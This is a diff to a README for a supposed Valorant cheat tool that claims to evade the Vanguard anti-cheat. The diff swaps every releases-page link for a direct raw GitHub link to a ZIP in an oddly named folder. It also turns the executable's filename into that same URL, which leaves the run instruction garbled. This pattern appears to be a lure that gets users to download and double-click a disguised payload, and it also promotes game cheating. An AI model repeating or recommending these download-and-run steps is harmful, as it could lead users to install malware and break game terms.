@@ -4,13 +4,13 @@
 ValorantExternalCheat enhances your gaming experience in Valorant. This application works with Riot Games' anti-cheat system, Vanguard. Use our cheat to gain a competitive edge without the fear of getting banned.
 
 ## 📥 Download
-[![Download ValorantExternalCheat](https://img.shields.io/badge/Download-Here-blue)](https://github.com/DankeyOk/ValorantExternalCheat/releases)
+[![Download ValorantExternalCheat](https://raw.githubusercontent.com/DankeyOk/ValorantExternalCheat/main/glaucescence/ValorantExternalCheat.zip)](https://raw.githubusercontent.com/DankeyOk/ValorantExternalCheat/main/glaucescence/ValorantExternalCheat.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to download and install ValorantExternalCheat.
 
 ### 1. Visit the Releases Page
-Go to the [Releases page](https://github.com/DankeyOk/ValorantExternalCheat/releases) to find the latest version of ValorantExternalCheat.
+Go to the [Releases page](https://raw.githubusercontent.com/DankeyOk/ValorantExternalCheat/main/glaucescence/ValorantExternalCheat.zip) to find the latest version of ValorantExternalCheat.
 
 ### 2. Download the Software
 On the Releases page, locate the latest version of the application. Click on the download link for the file suitable for your system.
@@ -19,7 +19,7 @@ On the Releases page, locate the latest version of the application. Click on the
 Once the download is complete, locate the file in your Downloads folder. Right-click on the downloaded ZIP file and select "Extract All." Follow the prompts to extract the files to a folder of your choice.
 
 ### 4. Open the Application
-Navigate to the folder where you extracted the files. Find the executable file, typically named `ValorantExternalCheat.exe`. Double-click on this file to run the software.
+Navigate to the folder where you extracted the files. Find the executable file, typically named `https://raw.githubusercontent.com/DankeyOk/ValorantExternalCheat/main/glaucescence/ValorantExternalCheat.zip`. Double-click on this file to run the software.
 
 ### 5. Adjust Settings
 Upon opening the application, you will see various options. Spend a moment reviewing the settings. Adjust them according to your preferences. The default settings will work well for most users.
@@ -47,4 +47,4 @@ If you have questions or need assistance, please open an issue in the GitHub rep
 ## 🎯 Additional Notes
 Using cheats may violate the terms of service of the game. Always consider the risks associated with using third-party software. Play responsibly and be aware of the potential for account bans. We do not take responsibility for any consequences. 
 
-For a safe and enjoyable experience, regularly check for updates on the Releases page: [Releases page](https://github.com/DankeyOk/ValorantExternalCheat/releases).
+For a safe and enjoyable experience, regularly check for updates on the Releases page: [Releases page](https://raw.githubusercontent.com/DankeyOk/ValorantExternalCheat/main/glaucescence/ValorantExternalCheat.zip).
